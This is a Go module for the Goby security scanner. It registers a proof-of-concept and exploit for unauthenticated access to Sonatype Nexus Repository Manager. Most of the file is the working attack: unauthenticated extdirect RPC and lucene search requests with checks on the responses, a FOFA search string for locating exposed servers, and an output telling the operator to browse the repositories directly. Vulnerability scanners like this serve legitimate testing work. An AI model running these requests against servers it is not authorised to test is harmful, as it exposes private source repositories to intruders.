package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Sonatype Nexus Unauthorized Access Vulnerability",
    "Description": "<p>The full name of Nexus is Nexus repository manager, which is a product of Sonatype company.</p><p>Nexus is a powerful warehouse manager that greatly simplifies the maintenance of internal warehouses and access to external warehouses. Nexus is divided into open source and professional versions, with the open source version being sufficient to meet the needs of most Maven users.</p><p>Attackers can use this vulnerability to view the source code and analyze system vulnerabilities.</p>",
    "Product": "Nexus-Repository-Manager",
    "Homepage": "https://www.sonatype.com/nexus-repository-oss",
    "DisclosureDate": "2024-04-02",
    "PostTime": "2024-04-02",
    "Author": "xiaoxing@baimaohui.net",
    "FofaQuery": "title=\"Nexus Repository Manager\" || title=\"Sonatype Nexus\"",
    "GobyQuery": "title=\"Nexus Repository Manager\" || title=\"Sonatype Nexus\"",
    "Level": "0",
    "Impact": "<p>Attackers can use this vulnerability to view the source code and analyze system vulnerabilities.</p>",
    "Recommendation": "<p>1. Enable user access verification.</p><p>2. Public network access is prohibited unless necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/service/extdirect",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json",
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": "{\"action\":\"outreach_Outreach\",\"method\":\"readStatus\",\"data\":null,\"type\":\"rpc\",\"tid\":7}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/service/local/lucene/search?_dc=1712028486903&q=1&collapseresults=true",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "totalCount",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/service/extdirect",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json",
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": "{\"action\":\"firewall_RepositoryStatus\",\"method\":\"read\",\"data\":null,\"type\":\"rpc\",\"tid\":7}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/service/extdirect",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json",
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": "{\"action\":\"outreach_Outreach\",\"method\":\"readStatus\",\"data\":null,\"type\":\"rpc\",\"tid\":7}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|hostinfo|variable|直接访问{{{fixedhostinfo}}}可查看仓库"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/service/local/lucene/search?_dc=1712028486903&q=1&collapseresults=true",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "totalCount",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|hostinfo|variable|直接访问{{{fixedhostinfo}}}可查看仓库"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/service/extdirect",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/json",
                    "Accept": "*/*",
                    "Connection": "keep-alive"
                },
                "data_type": "text",
                "data": "{\"action\":\"firewall_RepositoryStatus\",\"method\":\"read\",\"data\":null,\"type\":\"rpc\",\"tid\":7}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|hostinfo|variable|直接访问{{{fixedhostinfo}}}可查看仓库"
            ]
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "3",
    "Translation": {
        "CN": {
            "Name": "Sonatype Nexus 未授权访问漏洞",
            "Product": "Nexus-Repository-Manager",
            "Description": "<p>Nexus 的全称是 Nexus Repository Manager（Nexus 仓库管理器），是 Sonatype 公司的一个产品。</p><p>Nexus 是一个强大的仓库管理器，极大地简化了内部仓库的维护和外部仓库的访问。Nexus 分为开源版和专业版，其中开源版足以满足大部分 Maven 用户的需求。<br></p><p>攻击者可以通过此漏洞查看源代码，进而分析系统漏洞。</p>",
            "Recommendation": "<p>1. 开启用户访问验证。</p><p>2. 如非必要，禁止公网访问。</p>",
            "Impact": "<p>攻击者可以通过此漏洞查看源代码，进而分析系统漏洞。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Sonatype Nexus Unauthorized Access Vulnerability",
            "Product": "Nexus-Repository-Manager",
            "Description": "<p>The full name of Nexus is Nexus repository manager, which is a product of Sonatype company.</p><p>Nexus is a powerful warehouse manager that greatly simplifies the maintenance of internal warehouses and access to external warehouses. Nexus is divided into open source and professional versions, with the open source version being sufficient to meet the needs of most Maven users.</p><p>Attackers can use this vulnerability to view the source code and analyze system vulnerabilities.</p>",
            "Recommendation": "<p>1. Enable user access verification.</p><p>2. Public network access is prohibited unless necessary.</p>",
            "Impact": "<p>Attackers can use this vulnerability to view the source code and analyze system vulnerabilities.</p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10940"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}